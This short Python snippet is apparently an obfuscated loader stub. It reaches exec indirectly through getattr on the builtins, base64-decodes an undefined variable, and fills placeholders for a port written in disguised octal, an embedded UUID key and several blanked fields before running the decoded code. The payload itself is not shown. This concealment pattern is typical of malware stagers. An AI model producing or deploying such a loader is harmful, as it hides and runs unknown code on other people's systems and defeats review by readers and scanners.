import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "65b85a97-1ff0-4f26-b7d6-1f2d2c8c25ce")
    .replace("__vl__", "")
    .replace("__vm__", "")
    .replace("__tr__", "")
)